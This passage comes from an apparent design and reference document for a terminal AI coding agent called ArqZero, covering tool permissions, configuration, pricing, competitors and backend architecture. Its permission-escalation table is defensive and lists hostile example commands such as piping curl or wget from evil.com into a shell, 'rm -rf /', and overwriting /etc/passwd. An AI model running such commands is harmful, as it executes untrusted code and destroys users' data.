| **Permission** | `safe` |
| **Description** | Reads the current task list state |
| **Input** | (none) |
| **Behavior** | Returns all tasks from the in-memory store |

#### NotebookRead

| Property | Value |
|---|---|
| **Name** | `NotebookRead` |
| **Permission** | `safe` |
| **Description** | Reads a Jupyter notebook and returns cell contents with outputs |
| **Input** | `file_path` (string, required) |
| **Behavior** | Parses .ipynb JSON, formats cells with type indicators and outputs |

#### NotebookEdit

| Property | Value |
|---|---|
| **Name** | `NotebookEdit` |
| **Permission** | `ask` |
| **Description** | Edits a Jupyter notebook cell by index |
| **Input** | `file_path` (string, required), `cell_index` (number, required), `content` (string, required) |
| **Behavior** | Parses .ipynb, modifies specified cell, writes back |

### Path Traversal Protection

All file-operating tools (Read, Write, Edit, MultiEdit, Glob, LS, NotebookRead, NotebookEdit) use the `guardPath()` function (`src/tools/path-guard.ts`) to prevent path traversal attacks:

1. Relative paths are resolved against `cwd`
2. The resolved path must be within one of three allowed zones:
   - The current working directory
   - The user's home directory
   - The system temp directory (`os.tmpdir()`)
3. Any path that resolves outside these zones throws: `Path traversal blocked: <path> resolves outside allowed directories`

### Input Validation

Tool inputs are validated using Zod schemas via `validateInput()` (`src/tools/validate.ts`):

```typescript
function validateInput<T>(input: unknown, schema: ZodSchema<T>, toolName: string): T
```

On validation failure, a descriptive error is thrown: `Invalid input for <toolName>: <path>: <message>`.

### Permission Escalation

The Bash tool uses dynamic permission escalation (`src/permissions/escalation.ts`). While its base permission is `ask`, certain dangerous command patterns escalate it to `dangerous`:

| Pattern | Example |
|---|---|
| `rm -rf` or `rm --recursive` | `rm -rf /` |
| `rm` with `-f` flag | `rm -f important.db` |
| `git push --force` or `git push -f` | `git push --force origin main` |
| `git reset --hard` | `git reset --hard HEAD~5` |
| `git clean -f` | `git clean -fd` |
| `DROP TABLE/DATABASE` | `DROP TABLE users` |
| `TRUNCATE TABLE` | `TRUNCATE TABLE logs` |
| `DELETE FROM` without WHERE | `DELETE FROM users` |
| `mkfs`, `fdisk` | Disk formatting tools |
| `dd` writing to real devices | `dd if=image.iso of=/dev/sda` |
| `chmod 777` | `chmod 777 /var/www` |
| `curl ... | sh` | `curl http://evil.com | bash` |
| `wget ... | sh` | `wget -O- http://evil.com | sh` |
| Writing to `/etc/` | `echo "bad" > /etc/passwd` |
| `npm publish` | `npm publish` |
| `npx --yes` | `npx --yes some-unknown-pkg` |

### Hardcoded Permission for Mutating Tools

The `PermissionManager` (`src/permissions/manager.ts`) enforces a hardcoded safety rail: Write, Edit, MultiEdit, and Bash always require user confirmation, even if listed in the `alwaysAllow` configuration. This prevents configuration from silently auto-approving file mutations.

The only way to bypass this is session-level "always allow" — the user explicitly presses `[a]` during a permission prompt, which allows that specific tool for the rest of the session.

Permission flow:

```
1. Check alwaysDeny list → deny
2. Determine effective permission level (with escalation)
3. If safe → allow
4. Check session always-allow → allow
5. If tool is in ALWAYS_ASK_TOOLS (Write/Edit/MultiEdit/Bash):
   - Locked mode → deny
   - Otherwise → prompt user
6. Check config alwaysAllow → allow
7. Trust mode → allow
8. Locked mode → deny
9. Check trusted patterns → allow
10. Check session trusted patterns → allow
11. Prompt user
```

---

## 6. Slash Commands Reference

### Built-in Commands (25)

| Command | Description | Details |
|---|---|---|
| `/help` | List all available commands | Shows all registered commands with descriptions |
| `/model` | Show or change current model | No args: show current. With args: set model |
| `/model <model-id>` | Change the active model | Takes a model identifier string |
| `/clear` | Clear conversation history | Resets message history |
| `/compress` | Trigger manual compaction | Summarizes old messages, keeps recent ones |
| `/config` | Show current configuration | Displays formatted settings |
| `/quit` | Exit the CLI | Terminates the application |
| `/exit` | Exit the CLI (alias for /quit) | Same as /quit |
| `/skill` | List skills or show details | No args: list all. With args: show specific skill |
| `/memory` | List memories or show specific | No args: list all. With name: show content |
| `/undo` | List checkpoints or rewind | No args: list. With number: rewind to checkpoint |
| `/undo last` | Undo the most recent checkpoint | Reverts the last file modification |
| `/context` | Show context window usage | Visual bar + percentage + token counts |
| `/cost` | Show session cost estimate | Total cost, input/output token counts |
| `/think` | Set reasoning effort | low/medium/high. No args: show current |
| `/permissions` | Show current permission rules | Default mode, allow/deny lists, trusted patterns |
| `/tools` | List all available tools | Name, permission level, description for each |
| `/status` | Show version, provider, model | Version, provider name, model, connection status |
| `/export` | Export conversation to file | Optional filename arg. Default: timestamped .md |
| `/check` | Check installation health | Config dir, API key, tool count, MCP servers |
| `/setup` | Generate ARQZERO.md template | Creates project instruction file in cwd |
| `/agents` | List custom agents | Scans ~/.arqzero/agents/ for directories |
| `/loop` | Create recurring prompt | `/loop <interval> <prompt>` or `/loop stop` |
| `/vim` | Toggle vim mode | Enables/disables vim keybindings in input |
| `/reload-plugins` | Reload all plugins | Re-scans plugin directories and re-registers |
| `/plugin` | Manage plugins | `disable <name>`, `enable <name>`, or list |

### Custom Commands

Users can create custom slash commands by placing `.md` files in:
- `.arqzero/commands/` (project-level, higher priority)
- `~/.arqzero/commands/` (global)

A file named `deploy.md` creates the command `/deploy`. The file content becomes the prompt text, with `$ARGUMENTS` replaced by whatever the user types after the command.

Example: `.arqzero/commands/review.md`

```markdown
Review the following file for bugs, security issues, and code quality:
$ARGUMENTS

Focus on:
1. Error handling completeness
2. Input validation
3. Security vulnerabilities
4. Performance concerns
```

Usage: `/review src/api/auth.ts`

Project-level commands override global commands with the same name.

Implementation: `src/commands/custom-loader.ts`.

---

## 7. Configuration

### Config File

The main configuration file is `~/.arqzero/config.json`:

```json
{
  "provider": "fireworks",
  "model": "accounts/fireworks/models/glm-4p7",
  "fireworksApiKey": "fw_...",
  "tavilyApiKey": "tvly_...",
  "maxTokens": 8192,
  "permissions": {
    "defaultMode": "ask",
    "alwaysAllow": ["Read", "Glob", "Grep"],
    "alwaysDeny": [],
    "trustedPatterns": {
      "Bash": ["npm run *", "npx tsx --test *"]
    }
  },
  "mcpServers": {
    "my-server": {
      "command": "npx",
      "args": ["-y", "my-mcp-server"],
      "env": {}
    }
  },
  "bash": {
    "defaultTimeout": 30000,
    "maxTimeout": 600000
  }
}
```

Schema definition: `src/config/schema.ts` using Zod.

| Field | Type | Default | Description |
|---|---|---|---|
| `provider` | `"fireworks"` | `"fireworks"` | LLM provider (currently only fireworks) |
| `model` | string | `"accounts/fireworks/models/glm-4p7"` | Default model identifier |
| `fireworksApiKey` | string | (required) | API key for Fireworks AI |
| `tavilyApiKey` | string | (optional) | API key for Tavily search |
| `maxTokens` | number | `8192` | Maximum output tokens per LLM call |
| `permissions` | object | see below | Permission configuration |
| `mcpServers` | object | `{}` | MCP server configurations |
| `bash.defaultTimeout` | number | `30000` | Default bash command timeout in ms |
| `bash.maxTimeout` | number | `600000` | Maximum bash command timeout in ms |

### Settings Hierarchy

Settings are loaded from multiple sources and merged with this priority (highest wins first):

1. **CLI arguments** (`--model`, `--auto-approve`, `--allowedTools`, `--verbose`)
2. **Environment variables** (`ARQZERO_MODEL`, `ARQZERO_API_KEY`, etc.)
3. **Project settings** (`.arqzero/settings.json` in the project directory)
4. **User settings** (`~/.arqzero/settings.json`)
5. **Config file** (`~/.arqzero/config.json` — base defaults)

Settings merge rules:
- Scalar values: higher priority overrides lower
- `permissions.deny`: always union (deny rules from all levels are combined)
- `env`: project overrides user (shallow merge)
- `hooks`: project overrides user (no merge)
- `mcpServers`: shallow merge (project overrides user per server name)

Settings schema (`src/config/settings.ts`):

```typescript
interface Settings {
  model?: string;
  maxTokens?: number;
  reducedMotion?: boolean;
  syntaxHighlightingDisabled?: boolean;
  theme?: 'dark' | 'light';
  permissions?: {
    allow?: string[];
    deny?: string[];
    ask?: string[];
  };
  env?: Record<string, string>;
  hooks?: HookDefinition[];
  mcpServers?: Record<string, unknown>;
}
```

### Runtime Config

Runtime settings control TUI behavior:

| Setting | Type | Default | Description |
|---|---|---|---|
| `reducedMotion` | boolean | `false` | Disables shimmer spinner animation |
| `syntaxHighlightingDisabled` | boolean | `false` | Disables syntax highlighting in code blocks |
| `verbose` | boolean | `false` | Enables verbose logging |
| `theme` | `'dark'` / `'light'` | `'dark'` | Color theme |

Implementation: `src/config/runtime.ts`.

### ARQZERO.md Project Instructions

ArqZero loads `ARQZERO.md` from the project root (and up to 3 parent directories) as project-specific instructions. This is the equivalent of Claude Code's `CLAUDE.md`.

The file content is injected into the system prompt under the heading "## Project Instructions (from ARQZERO.md)".

The `/setup` command generates a template:

```markdown
# Project Instructions

## Overview
Describe your project here.

## Conventions
- Add coding conventions and patterns

## Important Files
- List key files and their purposes

## Notes
- Additional context for the AI assistant
```

### Environment Variables

ArqZero respects environment variables prefixed with `ARQZERO_`:

| Variable | Maps To | Example |
|---|---|---|
| `ARQZERO_MODEL` | `model` | `accounts/fireworks/models/glm-4p7` |
| `ARQZERO_API_KEY` | `fireworksApiKey` | `fw_...` |
| `ARQZERO_MAX_TOKENS` | `maxTokens` | `16384` |
| `ARQZERO_PROVIDER` | `provider` | `fireworks` |

Environment variable loading: `src/config/env.ts`.

---

## 8. Competitive Analysis

### ArqZero vs Claude Code (Anthropic)

| Dimension | ArqZero | Claude Code |
|---|---|---|
| **Interface** | Terminal TUI ("The Grid") | Terminal TUI |
| **LLM** | Any OpenAI-compatible (BYOK) | Claude only (Anthropic key or Max subscription) |
| **Price** | $12/mo + user's API costs | $20/mo Max or API key with per-token billing |
| **Capabilities** | 42 structured capabilities with verification gates | Ad-hoc prompting with no formal methodology system |
| **Subagents** | 7 parallel via Dispatch tool | Task tool for sub-agents |
| **Verification gates** | Mandatory completion checks | No equivalent |
| **Open source** | Open-core (planned) | Source-available but not open source |
| **Memory** | Cross-session in ~/.arqzero/memory/ | Auto-memory in CLAUDE.md |
| **Hooks** | 11 events, command + HTTP handlers | Hooks system |
| **MCP** | Supported | Supported |
| **Plugins** | Plugin manifest system | No plugin system |

**Where ArqZero wins:** LLM flexibility (any provider, not just Anthropic), structured methodology enforcement (42 capabilities vs free-form), lower price point ($12 vs $20), verification gates that prevent incomplete work, open-core trust model.

**Where Claude Code wins:** Backed by Anthropic (direct Claude API access, optimized for Claude models), larger user base and community, mature product with extensive testing, integrated with Anthropic's subscription plans. Claude itself is a stronger model than most alternatives ArqZero users might use.

### ArqZero vs Cursor

| Dimension | ArqZero | Cursor |
|---|---|---|
| **Interface** | Terminal TUI | VS Code fork (full IDE) |
| **LLM** | Any OpenAI-compatible (BYOK) | GPT-4, Claude (included) |
| **Price** | $12/mo + API costs | $20/mo (includes compute) |
| **Approach** | Agent-first (runs tools, modifies files) | Code completion + chat sidebar |
| **Capabilities** | 42 structured methodologies | No capability system |
| **Terminal native** | Yes — works over SSH, in tmux, headless | No — requires GUI |
| **Open source** | Open-core (planned) | Closed source |

**Where ArqZero wins:** Works in any terminal (SSH, containers, headless CI), no GUI requirement, any LLM provider, structured methodologies, lower price. Terminal agents can do things IDE extensions cannot: run on servers, inside Docker containers, over SSH tunnels.

**Where Cursor wins:** Full IDE experience with inline code completion, visual diff review, file tree, integrated debugging. Most developers prefer GUI editors for daily coding. Cursor includes compute costs in the subscription — users do not pay separately for LLM calls.

### ArqZero vs Continue

| Dimension | ArqZero | Continue |
|---|---|---|
| **Interface** | Terminal TUI | VS Code / JetBrains extension |
| **LLM** | Any OpenAI-compatible | Any (BYOK) |
| **Price** | $12/mo (Pro) | Free (open source, MIT) |
| **Capabilities** | 42 structured methodologies | No capability system |
| **Subagents** | 7 parallel | No subagent system |
| **Open source** | Open-core | Fully open (MIT) |

**Where ArqZero wins:** Structured methodologies, subagent dispatch, verification gates, terminal-native (works over SSH), cross-session memory, plugin system with hooks.

**Where Continue wins:** Completely free, fully open source (MIT), works inside VS Code and JetBrains IDEs which is where most developers already are, no subscription needed.

### ArqZero vs Kilo Code

| Dimension | ArqZero | Kilo Code |
|---|---|---|
| **Interface** | Terminal TUI | VS Code extension |
| **LLM** | Any OpenAI-compatible | Multiple providers |
| **Price** | $12/mo (Pro) | Free (open source) |
| **Capabilities** | 42 structured methodologies | Mode-based (code, architect, ask) |
| **Terminal native** | Yes | No |

**Where ArqZero wins:** Deeper capability system (42 vs a few modes), subagent parallelization, terminal-native, verification gates.

**Where Kilo Code wins:** Free, VS Code integration, visual UI, no separate terminal needed.

### ArqZero vs OpenCode

| Dimension | ArqZero | OpenCode |
|---|---|---|
| **Interface** | Terminal TUI (Ink/React) | Terminal TUI (Go) |
| **LLM** | Any OpenAI-compatible | Multiple providers |
| **Language** | TypeScript | Go |
| **Price** | $12/mo (Pro) | Free |
| **Capabilities** | 42 structured methodologies | No capability system |
| **Plugins** | Plugin manifest system | No plugin system |

**Where ArqZero wins:** Capability system, verification gates, subagent dispatch, plugin system, cross-session memory, hooks.

**Where OpenCode wins:** Written in Go (single binary, no Node.js dependency), free, simpler installation, potentially faster startup.

### ArqZero vs Aider

| Dimension | ArqZero | Aider |
|---|---|---|
| **Interface** | Terminal TUI (rich) | Terminal CLI (text-based) |
| **LLM** | Any OpenAI-compatible | Multiple providers |
| **Language** | TypeScript | Python |
| **Price** | $12/mo (Pro) | Free (open source) |
| **Approach** | Multi-tool agent with capabilities | Git-centric code editing |
| **Capabilities** | 42 structured methodologies | No capability system |
| **Tools** | 18 built-in + MCP | File edit focused |

**Where ArqZero wins:** Rich TUI, 18 tools (Aider is primarily about editing), capability system, subagent dispatch, verification gates, hooks, plugins, MCP support.

**Where Aider wins:** Mature and battle-tested, large community, excellent git integration (automatic commits), works with many models out of the box, free, Python ecosystem (pip install). Aider has benchmarks showing strong performance across many models.

### ArqZero vs WARP

| Dimension | ArqZero | WARP |
|---|---|---|
| **Interface** | Terminal TUI | Terminal emulator with AI |
| **Approach** | Coding agent | AI-enhanced terminal |
| **Price** | $12/mo (Pro) | Free tier + paid |
| **Capabilities** | 42 structured methodologies | Command suggestions, AI chat |

**Where ArqZero wins:** Full coding agent (reads, writes, edits files, runs tests), structured methodologies, subagent dispatch.

**Where WARP wins:** WARP is a terminal emulator, not just an agent — it replaces the entire terminal experience. AI is embedded in the shell workflow. WARP has a modern UI with blocks, completions, and workflows.

### ArqZero vs GitHub Copilot CLI

| Dimension | ArqZero | GitHub Copilot CLI |
|---|---|---|
| **Interface** | Terminal TUI | Terminal inline |
| **LLM** | Any OpenAI-compatible | GPT-4 (GitHub) |
| **Price** | $12/mo (Pro) | $10/mo (Copilot Individual) |
| **Approach** | Multi-tool coding agent | Command suggestion + explanation |
| **Tools** | 18 built-in | Command generation only |

**Where ArqZero wins:** Full agent with file manipulation, not just command suggestions. 42 capabilities, subagent dispatch, verification gates, session memory.

**Where GitHub Copilot CLI wins:** Deep GitHub integration, backed by Microsoft/OpenAI, part of the Copilot ecosystem (IDE + CLI + chat), large existing user base, simpler UX for quick command lookups.

### Summary Matrix

| Feature | ArqZero | Claude Code | Cursor | Continue | Kilo Code | OpenCode | Aider | WARP | Copilot CLI |
|---|---|---|---|---|---|---|---|---|---|
| Terminal native | Yes | Yes | No | No | No | Yes | Yes | Yes* | Yes |
| Any LLM (BYOK) | Yes | No | No | Yes | Yes | Yes | Yes | No | No |
| Structured capabilities | 42 | No | No | No | Modes | No | No | No | No |
| Verification gates | Yes | No | No | No | No | No | No | No | No |
| Subagent dispatch | 7 parallel | Yes | No | No | No | No | No | No | No |
| Free tier | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | No |
| Open source | Open-core | No | No | MIT | Yes | Yes | Apache | No | No |
| Price (paid) | $12/mo | $20/mo | $20/mo | Free | Free | Free | Free | $15/mo | $10/mo |

*WARP is a terminal emulator, not a terminal app.

---

## 9. Commercial Strategy

### Business Model

ArqZero uses a BYOK (Bring Your Own Key) model. Users bring their own LLM API key and pay ArqZero for the intelligence layer — capabilities, subagents, verification gates, memory, plugins.

This means:
- **Zero inference costs** for ArqZero — users pay their LLM provider directly
- **~95% margins** on subscriptions (only costs are license server, website, payment processing)
- **No vendor lock-in** — users can switch LLM providers without changing their ArqZero subscription

### Pricing Tiers

| Tier | Price | Target |
|---|---|---|
| **Free** | $0 | Evaluation users, hobbyists |
| **Pro** | $12/mo | Professional developers |
| **Team** | $30/user/mo | Development teams |

#### Free Tier

| Feature | Included |
|---|---|
| Tools | 9 basic: Read, Write, Edit, Bash, Glob, Grep, LS, WebSearch, WebFetch |
| Slash commands | 5: /help, /clear, /config, /quit, /status |
| Capabilities | 10 (basic selection) |
| Subagents | No |
| Memory | No |
| Plugins | No |
| Session resume | No |
| Checkpoints / /undo | No |
| Custom commands | No |
| Worktrees | No |
| MCP | No |
| Hooks | No |
| Headless mode (-p) | Yes |
| Daily message limit | 50 |
| Markdown rendering | Basic |
| Shimmer spinner | No (static spinner) |
| Diff previews | No |

#### Pro Tier ($12/mo)

Everything in Free, plus:

| Feature | Included |
|---|---|
| Tools | All 18: adds MultiEdit, NotebookRead/Edit, TodoWrite/Read, BashOutput, KillShell, Dispatch, Prompt |
| Slash commands | All 25+ |
| Capabilities | All 42 with verification gates |
| Subagents | Up to 7 parallel |
| Memory | Cross-session persistence |
| Plugins | Full plugin system |
| Session resume | -c and --resume |
| Checkpoints / /undo | Yes |
| Custom commands | Yes |
| Worktrees | Yes |
| MCP | Yes |
| Hooks | Yes |
| Daily message limit | Unlimited |
| Shimmer spinner | Yes |
| Diff previews | Yes |

#### Team Tier ($30/user/mo)

Everything in Pro, plus:

| Feature | Included |
|---|---|
| Shared team memory | Cross-user memory sharing |
| ARQZERO.md sync | Team-wide project instructions |
| Team settings profiles | Shared configuration |
| Usage dashboard | Per-user usage statistics |
| Priority support | Faster response times |

### Feature Gating Implementation

Each feature checks the user's tier before executing:

```typescript
if (PAID_TOOLS.has(toolName) && config.tier === 'free') {
  return { content: 'This tool requires ArqZero Pro. Upgrade at arqzero.dev', isError: true };
}
```

Tier checks are distributed across feature code paths (tools, commands, capabilities, memory, plugins) rather than centralized in a single gate. This makes bypass harder and degradation graceful.

### Distribution

**Primary:** npm

```bash
npm install -g arqzero
arqzero setup
```

The package is public on npm. Source code follows an open-core model:

- `arqzero` (public, MIT) — core engine, tools, permissions, TUI, API adapter
- `@arqzero/pro` (private npm, requires license) — subagent system, memory, plugins, full capability registry, checkpoints

Free users get the public package. Pro users install `@arqzero/pro` which the main package dynamically loads if present.

**Secondary:** Website (arqzero.dev)

Pages:
1. Landing page — terminal demo GIF, value prop, pricing
2. Docs — installation, configuration, tools reference, capabilities guide
3. Pricing — three tiers with feature comparison
4. Blog — release notes, tutorials, competitive comparisons
5. Dashboard — license management, usage stats, billing

### LLM Provider Support

ArqZero works with any OpenAI-compatible endpoint:

| Provider | baseURL | Notes |
|---|---|---|
| Fireworks AI | `https://api.fireworks.ai/inference/v1` | Default. GLM-4.7 (400B) |
| OpenAI | `https://api.openai.com/v1` | GPT-4o, o1 |
| Together AI | `https://api.together.xyz/v1` | Open-source models |
| Groq | `https://api.groq.com/openai/v1` | Fast inference |
| Ollama (local) | `http://localhost:11434/v1` | Free, private, offline |
| Anthropic (via proxy) | Various | Through OpenRouter or LiteLLM |
| Any OpenAI-compatible | User-configured | Maximum flexibility |

The single adapter uses the `openai` npm package with a configurable `baseURL`. ArqZero does not care which LLM is behind the endpoint — it works as long as it speaks OpenAI chat completions with tool use.

---

## 10. Infrastructure Architecture

### System Overview

```
USER'S MACHINE                              ARQ BACKEND
┌───────────────────┐                   ┌────────────────────┐
│  ArqZero CLI      │──── HTTPS ───────>│  Hono (Node.js)    │
│  ~/.arqzero/      │  (max 1x/hour)    │  ┌──────────────┐  │
│    auth.json      │                   │  │ Auth Routes   │  │
│    usage.json     │                   │  │ License Routes│  │
│    config.json    │                   │  │ Usage Routes  │  │
│                   │                   │  │ Stripe Webhook│  │
│  User's LLM Key  │──── direct ──────>│  └──────┬───────┘  │
│  (never sent to   │  to Fireworks/    │         │          │
│   our backend)    │  OpenAI/etc       │  PostgreSQL (Supa) │
└───────────────────┘                   └────────────────────┘
                                                 │
                                         Stripe Webhooks
```

Key principle: **The user's LLM API key never touches ArqZero's backend.** It goes directly from the user's machine to their LLM provider. ArqZero's backend only handles authentication, licensing, and usage tracking.

### Backend Stack

| Component | Technology | Cost |
|---|---|---|
| API server | Hono (Node.js) | Railway ($5-10/mo) |
| Database | PostgreSQL | Supabase (free tier) |
| Email | Resend | Free tier |
| Payments | Stripe | 2.9% + $0.30 per transaction |
| Domain | arqzero.dev | ~$12/year |

### Auth Flow: Email + 6-Digit Code

No OAuth, no passwords, no browser redirects. Pure terminal flow:

1. User runs `arqzero login`
2. CLI prompts for email address
3. Backend sends a 6-digit verification code to email via Resend
4. User enters the code in the terminal
5. Backend issues JWT access token (1 hour) + refresh token (90 days)
6. Tokens stored in `~/.arqzero/auth.json` with 0600 permissions
7. On startup: if JWT expired, refresh silently. If refresh fails, prompt re-login.

### Token Management

| Token | Format | Lifetime | Contains |
|---|---|---|---|
| Access token | JWT (HS256) | 1 hour | user_id, tier, daily_cap |
| Refresh token | 256-bit random | 90 days | Opaque, hashed in DB |
| Verification code | 6 digits | 10 minutes | Hashed in DB |

### Database Schema

Five tables:

**users**
- `id` (UUID, PK)
- `email` (unique)
- `email_verified` (boolean)
- `display_name` (text)

**licenses**
- `id` (UUID, PK)
- `user_id` (FK → users)
- `tier` (enum: free/pro/team)
- `status` (enum: active/expired/cancelled)
- `stripe_customer_id` (text)
- `period_end` (timestamp)

**sessions**
- `id` (UUID, PK)
- `user_id` (FK → users)
- `refresh_token` (hashed)
- `machine_id` (text)
- `device_label` (text)
- `expires_at` (timestamp)

**daily_usage**
- `id` (UUID, PK)
- `user_id` (FK → users)
- `date` (date)
- `message_count` (integer)
- UNIQUE on (user_id, date)

**verification_tokens**
- `id` (UUID, PK)
- `user_id` (FK → users)
- `token_hash` (text)
- `purpose` (text)
- `expires_at` (timestamp)

### API Endpoints (8 total)

```
POST /auth/login       — Send verification code to email
POST /auth/verify      — Exchange code for JWT + refresh token
POST /auth/refresh     — Refresh access token
POST /auth/logout      — Revoke session

GET  /license          — Get current license tier and status
POST /usage/sync       — Sync daily usage count

POST /checkout/session — Create Stripe checkout URL
POST /webhooks/stripe  — Handle Stripe payment events
```

### Usage Tracking and Cap Enforcement

| Tier | Daily Cap | Tracking |
|---|---|---|
| Free | 50 messages/day | Client-side counter, synced to server every 10 messages |
| Pro | Unlimited | Tracked for analytics only |
| Team | Unlimited | Tracked for dashboard |

Enforcement is client-side first (fast, no network needed) with server reconciliation (prevents multi-device abuse). The server merges usage counts across devices.

### License Validation

- **Online check:** Once per day (or first run), call `/license` endpoint
- **Offline grace:** Cache the last validation for 7 days. ArqZero works offline for a week.
- **No per-request phone-home.** Validation is once per day, not per LLM call.
- **Graceful degradation:** If license check fails (network down), fall back to cached tier. If cache expired, fall back to free tier.

### Source Code Protection

ArqZero is distributed as JavaScript on npm. Full protection is not possible. The strategy:

1. **Minify/bundle with esbuild** — raises the effort needed to understand and modify the code
2. **Distribute tier checks across feature code** — no single gate to bypass. Tools, capabilities, commands, memory, and plugins all independently check the tier.
3. **JWT signature verification** — prevents fake tokens
4. **Accept reality** — determined developers can bypass anything in client-side JavaScript. The strategy is to make ArqZero good enough that $12/mo is worth paying. Over-investing in DRM alienates the target audience.

### Cost Structure

| Phase | Users | Monthly Cost |
|---|---|---|
| Launch | 0-1,000 | ~$25 (Supabase free + Railway $5 + Resend free + domain) |
| Growth | 1,000-10,000 | ~$50-100 (Supabase Pro + Railway Pro) |
| Scale | 10,000+ | ~$200 (same architecture, bigger instances) |

At 100 Pro subscribers ($1,200 MRR) and $25/mo costs, the margin is 98%.

---

## 11. Technical Specifications

### Language and Runtime

| Spec | Value |
|---|---|
| Language | TypeScript 5.9+ |
| Module system | ESM (`"type": "module"` in package.json) |
| Import convention | `.js` extensions on all relative imports |
| Runtime | Node.js 18.19.0+ |
| UI framework | Ink 6.x (React 19 for the terminal) |
| Build | `tsc` (TypeScript compiler) |
| Development | `tsx` (TypeScript execute, no build step) |
| Test runner | `npx tsx --test` (Node.js built-in test runner via tsx) |
| Package manager | npm |
| Linter | None configured (relies on TypeScript strict mode) |

### Dependencies

#### Production Dependencies

| Package | Version | Purpose |
|---|---|---|
| `@modelcontextprotocol/sdk` | ^1.27.1 | MCP client for external tool servers |
| `commander` | ^14.0.3 | CLI argument parsing |
| `fast-glob` | ^3.3.3 | File pattern matching for Glob tool |
| `highlight.js` | ^11.11.1 | Syntax highlighting in code blocks |
| `ink` | ^6.8.0 | React-based terminal UI framework |
| `ink-text-input` | ^6.0.0 | Text input component for Ink |
| `marked` | ^15.0.12 | Markdown parser |
| `marked-terminal` | ^7.3.0 | Markdown-to-terminal renderer |
| `openai` | ^6.32.0 | OpenAI-compatible API client (for Fireworks) |
| `react` | ^19.2.4 | React (peer dependency for Ink) |
| `tsx` | ^4.21.0 | TypeScript execution without build step |
| `typescript` | ^5.9.3 | TypeScript compiler |
| `zod` | ^4.3.6 | Schema validation |

#### Dev Dependencies

| Package | Version | Purpose |
|---|---|---|
| `@types/node` | ^25.3.1 | Node.js type definitions |
| `@types/react` | ^19.2.14 | React type definitions |

### File Structure

```
C:\Users\prana\Projekts\Workshop\Arq-CODE\
├── bin/
│   ├── arq.ts              TypeScript entry point (development)
│   ├── arq.d.ts            Type declarations for entry point
│   ├── arq.js              Compiled entry point
│   └── arqzero.mjs         npm package entry point
├── docs/
│   └── plans/              Design documents
├── src/
│   ├── agents/             Subagent system
│   │   ├── types.ts          AgentDefinition interface
│   │   ├── loader.ts         Load custom agents from ~/.arqzero/agents/
│   │   ├── loader.test.ts
│   │   ├── prompt-builder.ts Task-specific prompt construction
│   │   ├── prompt-builder.test.ts
│   │   ├── runner.ts         AgentRunner (spawn/manage sub-agents)
│   │   └── runner.test.ts
│   ├── api/                LLM provider layer
│   │   ├── provider.ts       LLMProvider interface
│   │   ├── types.ts          StreamEvent, Message, ChatRequest, TokenUsage
│   │   ├── fireworks/
│   │   │   ├── adapter.ts    OpenAI SDK with Fireworks baseURL
│   │   │   └── adapter.test.ts
│   │   └── mock/
│   │       ├── adapter.ts    Mock provider for testing
│   │       └── adapter.test.ts
│   ├── checkpoints/        File state snapshots
│   │   ├── store.ts          CheckpointStore (in-memory snapshots)
│   │   ├── store.test.ts
│   │   ├── rewind.ts         Rewind logic (restore files to checkpoint)
│   │   └── rewind.test.ts
│   ├── cli/                Terminal UI
│   │   ├── app.tsx           Main Ink application
│   │   ├── app.test.ts
│   │   ├── args.ts           CLI argument parsing (commander)
│   │   ├── args.test.ts
│   │   ├── cron.ts           Interval-based scheduler for /loop
│   │   ├── cron.test.ts
│   │   ├── diff-utils.ts     Diff formatting utilities
│   │   ├── diff-utils.test.ts
│   │   ├── headless.ts       Non-interactive execution mode
│   │   ├── headless.test.ts
│   │   ├── markdown.ts       Markdown rendering
│   │   ├── markdown.test.ts
│   │   ├── theme.ts          Colors, symbols, spinner verbs
│   │   ├── components/
│   │   │   ├── index.ts        Barrel file
│   │   │   ├── Header.tsx
│   │   │   ├── OperationLog.tsx
│   │   │   ├── OperationEntry.tsx
│   │   │   ├── GroupedOperationEntry.tsx
│   │   │   ├── CommandInput.tsx
│   │   │   ├── Footer.tsx
│   │   │   ├── PermissionInline.tsx
│   │   │   ├── DiffView.tsx
│   │   │   ├── Spinner.tsx
│   │   │   ├── SlashSuggestions.tsx
│   │   │   ├── TranscriptView.tsx
│   │   │   ├── settings-display.ts
│   │   │   ├── settings-display.test.ts
│   │   │   ├── operation-log.test.ts
│   │   │   ├── permission.test.ts
│   │   │   ├── slash-suggestions.test.ts
│   │   │   ├── spinner.test.ts
│   │   │   └── transcript.test.ts
│   │   └── hooks/
│   │       ├── useInputHistory.ts
│   │       └── useInputHistory.test.ts
│   ├── commands/           Slash command system
│   │   ├── registry.ts       SlashCommand interface and CommandRegistry
│   │   ├── registry.test.ts
│   │   ├── builtins.ts       25 built-in commands
│   │   ├── custom-loader.ts  Load .md files as custom commands
│   │   ├── custom-loader.test.ts
│   │   └── plugin-commands.ts /reload-plugins, /plugin
│   ├── config/             Configuration
│   │   ├── schema.ts         Zod schemas (AppConfig, Permissions, McpServer)
│   │   ├── schema.test.ts
│   │   ├── loader.ts         Load config from ~/.arqzero/config.json
│   │   ├── init.ts           First-run initialization
│   │   ├── env.ts            Environment variable loading
│   │   ├── env.test.ts
│   │   ├── runtime.ts        Runtime config (reducedMotion, etc.)
│   │   ├── runtime.test.ts
│   │   ├── settings.ts       Settings hierarchy (user + project merge)
│   │   └── settings.test.ts
│   ├── core/               Conversation engine
│   │   ├── engine.ts         ConversationEngine class
│   │   ├── engine.test.ts
│   │   ├── compaction.ts     Context compaction (summarize old messages)
│   │   ├── compaction.test.ts
│   │   ├── message.ts        Message constructors (user, assistant, tool result)
│   │   └── system-prompt.ts  System prompt builder (identity, ARQZERO.md, memory)
│   │   └── system-prompt.test.ts
│   ├── hooks/              Event system
│   │   ├── types.ts          HookEvent, HookDefinition, HookResult
│   │   ├── index.ts          Barrel
│   │   ├── registry.ts       HookRegistry (register, fire)
│   │   ├── registry.test.ts
│   │   ├── command-handler.ts Shell command hook execution
│   │   ├── command-handler.test.ts
│   │   ├── http-handler.ts   HTTP hook execution
│   │   └── http-handler.test.ts
│   ├── mcp/                Model Context Protocol
│   │   ├── client.ts         McpClientManager (connect, list tools, call)
│   │   ├── bridge.ts         Create ArqZero Tool adapters from MCP tools
│   │   └── bridge.test.ts
│   ├── memory/             Cross-session memory
│   │   ├── types.ts          MemoryEntry, MemoryType
│   │   ├── store.ts          MemoryStore (CRUD in ~/.arqzero/memory/)
│   │   ├── store.test.ts
│   │   ├── injector.ts       Inject memories into system prompt
│   │   └── injector.test.ts
│   ├── permissions/        Permission system
│   │   ├── manager.ts        PermissionManager (check flow, session state)
│   │   ├── manager.test.ts
│   │   ├── escalation.ts     Dynamic escalation (Bash → dangerous)
